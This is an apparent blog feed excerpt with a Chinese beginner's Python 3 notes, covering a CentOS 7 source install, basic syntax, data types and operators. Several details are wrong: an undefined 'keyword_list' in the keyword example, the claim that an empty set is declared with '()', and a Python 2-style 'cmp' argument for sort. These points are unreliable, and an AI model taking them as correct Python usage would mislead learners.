alt=""><br>图片编辑完毕，记得保存一下:<br><code>plt.savefig('test.png',bbox_inches='tight') #自动保存图表，并将图表周边的空白区域裁减掉 </code></p><p><a href="#head"><center><font color = "Crimson">back -- 返回</font></center><br></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;div id=&quot;head&quot;&gt;&lt;/div&gt;
&lt;h1&gt;Python 3&lt;/h1&gt;
&lt;hr&gt;
&lt;h4 id=&quot;b-i-font-color-LightSkyBlue-目录-font-i-b&quot;&gt;&lt;b&gt;&lt;i&gt;&lt;font color = &quot;LightSkyBlue&quot;&gt;目录&lt;/font&gt;&lt;i</summary>
      
    
    
    
    <category term="Language" scheme="http://blog.dvkunion.cn/categories/Language/"/>
    
    
    <category term="脚本" scheme="http://blog.dvkunion.cn/tags/%E8%84%9A%E6%9C%AC/"/>
    
    <category term="Python3" scheme="http://blog.dvkunion.cn/tags/Python3/"/>
    
  </entry>
  
  <entry>
    <title>python3--learning--①</title>
    <link href="http://blog.dvkunion.cn/2018/10/17/python3-learning%E2%91%A0/"/>
    <id>http://blog.dvkunion.cn/2018/10/17/python3-learning%E2%91%A0/</id>
    <published>2018-10-17T21:34:20.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<div id="head"></div><h1>Python 3</h1><hr><h4 id="b-i-font-color-LightSkyBlue-目录-font-i-b"><b><i><font color = "LightSkyBlue">目录</font><i><b></h4><p><a href="/2018/10/17/python3-learning①/">①</p><ol><li><a href="#0x00">0x00--序</a></li><li><a href="#0x01">0x01--环境搭建</a><ol><li><a href="#0x01-1">环境安装</a></li><li><a href="#0x01-2">Python3安装</a></li></ol></li><li><a href="#0x02">0x02--基本语法</a><ol><li><a href="#0x02-1">基本规则</a></li><li><a href="#0x02-2">基本数据结构</a></li><li><a href="#0x02-3">基本运算符</a></li></ol></li></ol><p><a href="/2018/10/19/python3-learning②/">②<br><a href="/2018/10/19/python3-learning③/">③</p><hr><div id="0x00"></div><h3 id="b-0x00-序-b"><b>0x00- - 序<b></h3><center><small>2018-10-17</small></center>  <p>运维安全的学习开始，这一部分开始学习早就有所耳闻但从未真正动手开始实际使用的一种语言- - Python<br>在这里所记录的主要是在 Centos-7 环境下 Python-3.7.0 的学习</p><blockquote><p>&quot;人生苦短，我用Pyhton&quot;</p></blockquote><center><small>2018/11/29</small></center>  <p>Python3 的系统性学习暂时告一段落，重新把课件和博客进行一遍整理，作为Python3<br>的基础笔记吧。<br>总的来说Python是一门很便捷的语言，他可以为你节省大量的时间和精力，为你省去复杂繁琐的实现过程，而给予你更多的时间去思考设计的逻辑，以及你想做的事。<br>虽然说 Python 十分便捷，但总觉得对于底层的概念Python有些过于省略，对于一个内置函数还是希望在未来多多了解一下他的实现过程、复杂度；对一个库能过一遍他的源码之类的操作。<br>(。・ω・。)总之还是撒花，庆祝第一门课程形式上的完结(。・ω・。)</p><center><small>华丽的分割线</small></center><hr><div id="0x01"></div><div id="0x01-1"></div><h3 id="b-0x01-环境搭建-b"><b>0x01- - 环境搭建<b></h3><h4 id="font-color-blue-环境安装-font-br"><font color = "blue">环境安装</font><br></h4><p>首先在虚拟机安装 Centos-7 的操作系统环境，记得勾选安装图形化界面的选项方便之后的一些操作。在安装的过程中会有一个GUI图形界面的选项，勾选之后安装就可以了。<br><br>安装好系统之后我们需要将虚拟机的网络接通，这里我们主要目的在于学习与测试python3，所以直接使用了NAT模式，将Centos的网卡配置文件内的 ONBOOT = yes。</p><div id="0x01-2"></div><h4 id="font-color-blue-Python3安装-font-br"><font color = "blue">Python3安装</font><br></h4><p>进入终端，首先要在官网下载python3的安装文件。<br>创建一个文件夹来安置python3，并在该文件夹下:<br><code>$ wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tgz</code><br><br>下载结束后解压文件<br><code>$ tar -xzvf Python-3.7.0.tgz</code><br><br>解压后进入到解压好的python目录下<br><code>$ cd Python-3.7.0/</code><br><br>安装Python<br><code>$ ./configure #编辑</code><br><code>$ make</code><br><code>$ make install</code><br><br>安装完成，终端输入python3 即可进入刚安装好的python3环境内。</p><p><img src="/img/4c06e311gy1fwblvc6lk0j20in02vmx4.jpg" alt=""></p><blockquote><p>P.S.</p><ul><li>1. 编译的过程是需要GCC\G++的C语言环境支持，如果是一台新配置 Centos 需要先配置GCC环境。( ゜- ゜)つロ</li><li>2. 下载安装解压使用root账户进行会省去很多麻烦。( ゜- ゜)つロ</li><li>3.按照上面步骤安装一般在make install时候会报一个错误，是因为其中一部分的依赖支持环境没有提前安装。部分功能会无法使用。支持环境在0x06- - Matplotlib安装与使用 中的安装部分有详细步骤。 ( ゜-<br>゜)つロ</li><li>4.干杯🍻( ゜- ゜)つロ</li></ul></blockquote><div id="0x02"></div><h3 id="b-0x02-基本语法-b"><b>0x02- - 基本语法<b></h3><div id="0x02-1"></div><h4 id="font-color-blue-基本规则-font-br"><font color = "blue">基本规则</font><br></h4><h6 id="b-1-编码-b"><b>1.编码<b></h6><ul><li>--Python 3 源码文件以 UTF-8 编码,字符串都是 unicode 字符串,</li></ul><h6 id="b-2-标识符-b"><b>2.标识符<b></h6><ul><li>--第一个字符必须是字母表中字母或下划线 _ 。</li><li>--标识符的其他的部分由字母、数字和下划线组成。</li><li>--标识符对大小写敏感。</li></ul><h6 id="b-3-保留字-b"><b>3.保留字<b></h6><p>Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line"><span class="built_in">print</span>(keyword_list)</span><br></pre></td></tr></table></figure><h6 id="b-4-注释-b"><b>4.注释<b></h6><p>Python 的注释一般有三种</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以用&#x27;#&#x27;来表示一行的注释</span></span><br><span class="line">(```)</span><br><span class="line">也可以用三个单引号来注释注释块</span><br><span class="line">(```)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">或是用三个双引号来注释注释块</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h6 id="b-5-缩进-b"><b>5.缩进<b></h6><p>python内的缩进十分严格。缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。</p><h6 id="b-6-多行语句-b"><b>6.多行语句<b></h6><p>Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠\来实现多行语句。</p><div id="0x02-2"></div><h4 id="font-color-blue-基本数据结构-font-br"><font color = "blue">基本数据结构</font><br></h4><h6 id="b-1-数字-Num-b"><b>1.数字--Num <b></h6><p>--声明</p><p><code>a = 5 #Python的数据不需要标注数据类型</code></p><p>--特性</p><blockquote><p>Num一共有四种不同的数值类型: int--整型，bool--布尔型，float--浮点型，complex--复数。</p></blockquote><p>--方法函数</p><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>abs(x)</td><td>返回数字的绝对值</td></tr><tr><td>ceil(x)</td><td>返回数字的上入整数</td></tr><tr><td>exp(x)</td><td>返回e的x次幂(e^x)</td></tr><tr><td>fabs(x)</td><td>返回数字的绝对值(浮点型)</td></tr><tr><td>floor(x)</td><td>返回数字的下舍整数</td></tr><tr><td>modf(x)</td><td>返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示</td></tr><tr><td>pow(x,y)</td><td>x**y 运算后的值</td></tr><tr><td>sqrt(x)</td><td>返回数字 x 的平方根</td></tr></tbody></table><h6 id="b-2-字符串-String-b"><b>2.字符串--String <b></h6><p>--声明</p><p><code>str1 = 'hello'</code><br>或<br><code>str2 = &quot;life is too short&quot;</code><br>也可以<br><code>str3 = '''so I use python'''</code></p><p>--特性</p><blockquote><p>String 不能被改变(Immutable)<br>String 中使用特殊字符时需要使用转义字符<br>String 前面加一个r/R(Raw String)使转义字符无效，即原始字符串<br>String 切片操作和所以可以双向 如：从左往右时，下标从0开始；从右往左时，下标从-1开始。<br>String 在python中代替了char的位置。即python中不存在char 类型</p></blockquote><p>--方法函数</p><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>str.title()</td><td>返回首字母大写的str</td></tr><tr><td>count(str, beg= 0,end=len(string))</td><td>返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数</td></tr><tr><td>find(str, beg=0 end=len(string))</td><td>检测 str 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-1</td></tr><tr><td>max(str)/min(str)</td><td>返回字符串 str 中最大/最小的字母。</td></tr><tr><td>str.lstrip()/str.rstrip()</td><td>删除字符串字符串串首/末尾的空格</td></tr><tr><td>replace(old, new [, max])</td><td>把 将字符串中的 str1 替换成 str2,如果 max 指定，则替换不超过 max 次。</td></tr><tr><td>startswith(str,beg=0,end=len(string))</td><td>检查字符串是否是以 obj 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查。</td></tr><tr><td>str.swapcase()</td><td>将字符串中大写转换为小写，小写转换为大写</td></tr><tr><td>str.upper()/str.lower()</td><td>转换字符串中的小写字母为大写/转换字符串中的大写字母为小写</td></tr><tr><td>str.isdecimal()</td><td>检查字符串是否只包含十进制字符，如果是返回 true，否则返回 false。</td></tr></tbody></table><h6 id="3-列表-List">3.列表--List</h6><p>--声明<br><code>list = []</code></p><p>--特性</p><blockquote><p>List 元素可变(Mutable)<br>List 切片/截取同String相同，左必右开</p></blockquote><p>--方法函数</p><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>len(list)</td><td>列表元素个数</td></tr><tr><td>max(list)/min(list)</td><td>返回列表元素最大值/最小值</td></tr><tr><td>list(seq)</td><td>将元组转换为列表</td></tr><tr><td>list.append(obj)</td><td>在列表末尾添加新的对象</td></tr><tr><td>list.count(obj)</td><td>统计某个元素在列表中出现的次数</td></tr><tr><td>list.index(obj)</td><td>从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td>list.insert(index, obj)</td><td>将对象插入列表</td></tr><tr><td>list.pop([index=-1])</td><td>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td>list.reverse()</td><td>反向列表中元素</td></tr><tr><td>list.sort(cmp=None, key=None, reverse=False)</td><td>对原列表进行排序</td></tr><tr><td>list.clear()</td><td>清空列表</td></tr><tr><td>list.copy()</td><td>复制列表</td></tr></tbody></table><h6 id="4-元组-Tuple">4.元组--Tuple</h6><p>--声明<br><code>tup = ()</code></p><p>--特性</p><blockquote><p>Tuple 元素不可变(Immutable)<br>Tuple 切片/截取同String相同，左必右开<br>Tuple 在声明时候注意:没有元素时的声明为：tup = ()；只存在一个元素时：tup = (6,)<br>Tuple 因为不可变，所以sort等函数无法使用。将Tuple转化为List即可</p></blockquote><p>--方法函数</p><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>len(tuple)</td><td>元组元素个数</td></tr><tr><td>max(tuple)/min(tuple)</td><td>返回元组元素最大值/最小值</td></tr><tr><td>tuple(seq)</td><td>将列表转换为元组</td></tr></tbody></table><h6 id="5-集合-Set">5.集合--Set</h6><p>--声明<br><code>set = ()</code><br>或者<br><code> set = &#123;var1,var2,var3....&#125;</code></p><p>--特性</p><blockquote><p>Set 是一个无序的不重复元素序列<br>Set 元素可变(Mutable)<br>Set 为空集合时必须用()来声明</p></blockquote><p>--方法函数</p><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>set.add( x )</td><td>将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作。</td></tr><tr><td>set.remove( x )</td><td>将元素 x 从集合 s 中移除，如果元素不存在，则会发生错误。</td></tr><tr><td>set.discard( x )</td><td>移除集合中的元素，且如果元素不存在，不会发生错误</td></tr><tr><td>union()</td><td>返回两个集合的并集</td></tr></tbody></table><h6 id="6-字典-Dictionary">6.字典--Dictionary</h6><p>--声明<br><code>dict = &#123;&#125;</code></p><p>--特性</p><blockquote><p>Dict 元素可变(Mutable)<br>Dict 键值必须是唯一的，值不必<br>Dict 值可以取任数据类型，但键必须是不可变的，如字符串，数字或元组<br>Dict 也可以看做是通过键：值对映射的集合</p></blockquote><p>--方法函数</p><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>len(dict)</td><td>字典元素个数</td></tr><tr><td>str(dict)</td><td>打印字典</td></tr><tr><td>type(var)</td><td>返回输入的变量类型，如果变量是字典就返回字典类型。</td></tr><tr><td>key in dict</td><td>如果键在字典dict里返回true，否则返回false</td></tr></tbody></table><h6 id="EOF-数据结构小结">EOF.数据结构小结</h6><p>String、List、Tuple 统称为序列。<br>Python内可变的数据结构有:List、Dictionary、Set<br>Python内不可变的数据结构有:String、Tuple、Number<br>除type()之外，还有一个isinstance(element,type)函数可以显示数据的类型。<br>其区别在于:type()不会认为子类是一种父类类型。<br>isinstance()会认为子类是一种父类类型。</p><div id="0x02-3"></div><h4 id="font-color-blue-基本运算符-font-br"><font color = "blue">基本运算符</font><br></h4><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>+</td><td>加 - 两个对象相加</td><td>a + b 输出结果 31</td></tr><tr><td>-</td><td>减 - 得到负数或是一个数减去另一个数</td><td>a - b 输出结果 -11</td></tr><tr><td>*</td><td>乘 - 两个数相乘或是返回一个被重复若干次的字符串</td><td>a * b 输出结果 210</td></tr><tr><td>/</td><td>除 - x 除以 y</td><td>b / a 输出结果 2.1</td></tr><tr><td>%</td><td>取模 - 返回除法的余数</td><td>b % a 输出结果 1</td></tr><tr><td>**</td><td>幂 - 返回x的y次幂</td><td>a**b 为10的21次方</td></tr><tr><td>//</td><td>取整除 - 返回商的整数部分</td><td>9//2 输出结果 4 , 9.0//2.0 输出结果 4.0</td></tr></tbody></table><br><p><a href="#head"><center><font color = "Crimson">back --返回</font></center><br></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;div id=&quot;head&quot;&gt;&lt;/div&gt;
&lt;h1&gt;Python 3&lt;/h1&gt;
&lt;hr&gt;
&lt;h4 id=&quot;b-i-font-color-LightSkyBlue-目录-font-i-b&quot;&gt;&lt;b&gt;&lt;i&gt;&lt;font color = &quot;LightSkyBlue&quot;&gt;目录&lt;/font&gt;&lt;i</summary>
      
    
    
    
    <category term="Language" scheme="http://blog.dvkunion.cn/categories/Language/"/>
    
    
    <category term="脚本" scheme="http://blog.dvkunion.cn/tags/%E8%84%9A%E6%9C%AC/"/>
    
    <category term="Python3" scheme="http://blog.dvkunion.cn/tags/Python3/"/>
    
  </entry>
  
</feed>
